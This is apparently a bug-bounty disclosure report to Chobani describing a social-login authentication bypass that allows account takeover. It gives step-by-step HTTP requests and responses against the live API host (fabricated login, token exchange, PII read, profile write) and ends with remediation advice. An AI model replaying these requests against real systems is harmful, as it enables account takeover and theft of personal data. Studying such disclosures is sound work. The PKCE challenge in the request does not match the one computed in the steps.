@@ -1,0 +1,185 @@
+Broken Social Login – Authentication Bypass Leading to Account Takeover (Read + Write)
+Add Hacker summary
+Timeline · export
+swilam0
+submitted a report to Chobani.
+August 2, 2026, 2:32pm UTC
+Summary
+The POST /api/v1/oauth/sociallogin endpoint authenticates users based entirely on client-supplied JSON and does not validate the identity token's signature, issuer, audience, or the binding between the supplied emailid / socialUId and a real Google/Firebase identity. Because the backend trusts the attacker-supplied identity, an unauthenticated remote attacker can:
+
+    Fabricate a social-login request for any email address (verified against real, pre-existing accounts such as admin@chobani.com) and receive a valid authorizationCode.
+    Exchange that code for a fully signed server-issued session (bmt JWT cookie + bvt + CSRF + device tokens) - no credentials, no valid Google token, no MFA.
+    Read the victim's complete profile (PII: name, DOB, gender, mobile, postal code, state, marketing prefs).
+    Write / modify the victim's profile via POST /api/v1/user/update - demonstrated end-to-end with persistence.
+
+This is a critical broken-authentication flaw leading to full account takeover with read AND write access to any Chobani user account.
+Affected Endpoints
+Endpoint	Method	Purpose
+/api/v1/oauth/sociallogin	POST	Issue authorization code for attacker-chosen identity
+/api/v1/oauth/token	POST	Exchange code → session (JWT + cookies + CSRF/device tokens)
+/api/v1/user/details	GET	Read victim profile (authenticated)
+/api/v1/user/update	POST	Modify victim profile (authenticated)
+Root Cause
+
+    The social-login request body carries identity fields - firstName, lastName, userName, emailid, socialUId, issuer, audience, active, isadmin - that are trusted verbatim by the server.
+    There is no server-side token validation (no Google/Firebase signature, issuer, or audience verification) and no proof-of-ownership for the emailid.
+    The token-exchange endpoint then mints a server-signed RS256 JWT (bmt) whose user.eml claim equals the attacker-chosen email, producing a fully legitimate session.
+
+Steps to Reproduce
+
+    Compute the PKCE challenge for verifier TESTVERIFIER123456789012345678901234567890: challenge = base64url( SHA-256( verifier ) ) → xgOSPH29r2e6mYbHGnOsDas3tQa1uJLF-f1QySSFp2E.
+    POST /api/v1/oauth/sociallogin with the attacker-chosen victim emailid and an arbitrary socialUId (no real Google token sent) → returns authorizationCode.
+    POST /api/v1/oauth/token (same cookie jar) with that code + the verifier → returns bmt/bvt/rft cookies plus csrftoken and devicetoken.
+    Call GET /api/v1/user/details (read) and POST /api/v1/user/update (write) as the victim.
+
+Proof of Concept
+Two self-contained scripts reproduce this end-to-end against api.chobani.com:
+Code
+•154 Bytes
+bash social_ato_poc.sh victim@example.com [first] [last] [suid]
+bash social_ato_profile_write_poc.sh victim@example.com [newFirst] [newLast] [place] [zip]
+Request 1 - Fabricated social login (no credentials)
+Code
+•683 Bytes
+POST /api/v1/oauth/sociallogin HTTP/2
+Host: api.chobani.com
+Accept: application/json
+Content-Type: application/json
+x-loggedin: false
+x-site: chobanid2c|en-US|GBP
+
+{"firstName":"big","lastName":"bug","userName":"bigbug","emailid":"bugfarmers.sec@gmail.com","provider":["email"],"active":true,"isadmin":true,"issuer":"https://securetoken.google.com/retbgbm","expiresIn":3600,"audience":"retbgbm","socialUId":"attacker-suid-<random>","clientId":"nieocom_web_app","redirectURI":"https://www.chobani.com","scope":"profile","responseType":"code","state":"test123","codeChallenge":"xg2SPH29r2e6mYbHGnOsDas3tQa1uJLF-f1FySSFp2E","codeChallengeMethod":"SHA256","storeid":"001","storename":""}
+Response 1 - HTTP 200 (valid authorization code issued):
+Code
+•102 Bytes
+{
+  "state": "test123",
+  "authorizationCode": "2PIC1Cty5Hig/31L5Xf5dA0tB79g=",
+  "zipCode": "44715"
+}
+Request 2 - Exchange the code for a session (same cookie jar)
+Code
+•387 Bytes
+POST /api/v1/oauth/token HTTP/2
+Host: api.chobani.com
+Accept: application/json
+Content-Type: application/json
+x-loggedin: false
+x-site: chobanid2c|en-US|GBP
+
+{"clientId":"nieocom_web_app","redirectUri":"https://www.chobani.com","grantType":"authorization_code","responseType":"token","authCode":"2PIC1Cty5Hig/31L5Xf5dA0tB79g=","codeVerifier":"TESTVERIFIER123456789012345678901234567890"}
+Response 2 - HTTP 200, session cookies + tokens issued:
+Code
+•438 Bytes
+HTTP/2 200
+set-cookie: bmt=<JWT>; Max-Age=604800; Domain=api.chobani.com; Path=/; Secure; HttpOnly; SameSite=Strict
+set-cookie: bvt=<token>; Domain=chobani.com; Path=/; Secure; HttpOnly; SameSite=Strict
+set-cookie: rft=<token>; Path=/api/v1/oauth/token; Secure; HttpOnly
+
+{"firstName":"victim","csrftoken":"49ad19a2-b0df-4294-a994-f3605f24496","devicetoken":"6f532d17-b9a9-44af-b1af-d77a1b23d884","tokentype":"access_token","userid":null}
+Decoded bmt JWT payload - user.eml claim equals the attacker-chosen email:
+Code
+•126 Bytes
+{
+  "sub": "<victim useruid>",
+  "user": {"eml": "victim@example.com"},
+  "iss": "tcsnieocom.com",
+  "aud": "tcsnieocom.com"
+}
+Request 3 - Read the victim profile (authenticated)
+Code
+•233 Bytes
+GET /api/v1/user/details HTTP/2
+Host: api.chobani.com
+Cookie: bmt=<JWT>; bvt=<token>
+Accept: application/json
+Content-Type: application/json
+x-loggedin: true
+x-dvt: <devicetoken>
+X-CSRF-Token: <csrftoken>
+x-site: chobanid2c|en-US|GBP
+Response 3 - HTTP 200 (victim PII returned):
+Code
+•427 Bytes
+{
+  "id": "6a661b6c8394e535dcecd11c",
+  "userid": "75c59ea2-6821-48a8-b64c-35617c7fd5a4",
+  "firstName": "swi",
+  "lastName": "hack",
+  "userName": "big",
+  "emailid": "bugfarmers.sec@gmail.com",
+  "dob": "09/03/1996",
+  "gender": "male",
+  "mobile": "7876678788",
+  "storeid": "001",
+  "storename": "",
+  "provider": ["email","google"],
+  "userType": "User",
+  "place": "Alaska",
+  "zipCode": "44715",
+  "updateStore": false
+}
+Request 4 - Modify the victim profile (write access)
+Code
+•414 Bytes
+POST /api/v1/user/update HTTP/2
+Host: api.chobani.com
+Cookie: bmt=<JWT>
+Referer: https://www.chobani.com/
+Origin: https://www.chobani.com
+Accept: application/json
+Content-Type: application/json
+x-loggedin: true
+x-dvt: <devicetoken>
+X-CSRF-Token: <csrftoken>
+x-site: chobanid2c|en-US|GBP
+
+{"firstName":"swi","lastName":"hack","place":"Alaska","zipCode":"44715","emailedit":false,"mobedit":false,"updateStore":false}
+Response 4 - HTTP 200 (write accepted; persisted):
+Code
+•259 Bytes
+{
+  "id": "6a661b6c8394e535dcecd11c",
+  "userid": "75c59ea2-6821-48a8-b64c-35617c7fd5a4",
+  "firstName": "swi",
+  "lastName": "hack",
+  "userName": "big",
+  "emailid": "bugfarmers.sec@gmail.com",
+  "storeid": "001",
+  "place": "Alaska",
+  "zipCode": "44715"
+}
+Confirmation: A subsequent GET /api/v1/user/details returns "lastName": "hack", proving the write persisted.
+Image
+•96.04 KiB•F6379225: image.png
+
+## Supporting Material/References
+
+    Proof artifacts: social_ato_poc.sh, social_ato_profile_write_poc.sh
+    Response captures: ato_admin_details.json, target_victim_profile.json, profile_update_response.json, profile_after_update.json
+
+Validated against the live environment on 2026-08-02 on a test-controlled account and a real pre-existing account (admin@chobani.com) to confirm impact. No real-user data was altered.
+Impact
+An unauthenticated attacker can:
+
+    Take over any existing account (admin@chobani.com etc.) without credentials, password, or valid Google token.
+    Read PII: name, date of birth, gender, mobile number, postal code, state, marketing preferences.
+    Write/modify victim profile data including name, location, postal code (demonstrated with persistence).
+    Pre-register a victim email (account takeover / doppelganger attack).
+    Bypass account lockout - the social flow succeeds even when the target account is accountLocked: true.
+
+Business Impact
+
+    Complete compromise of user accounts and customer trust
+    Exposure of personally identifiable information (PII) for all Chobani users
+    Regulatory compliance violations (GDPR, CCPA) due to unauthorized access to personal data
+    Potential for mass account takeover campaigns
+    Reputational damage to Chobani brand
+
+Remediation Recommendations
+
+    Validate the Google/Firebase identity token server-side (signature via JWKS; check iss, aud, exp) before linking an account.
+    Never derive emailid/socialUId from unverified client JSON - use confirmed id-token claims only.
+    Require proof of email ownership before creating or linking a social login to an existing account.
+    Enforce account lockout on all authentication flows, including social login.
+    Add rate limiting and anomaly detection on /oauth/sociallogin endpoint.
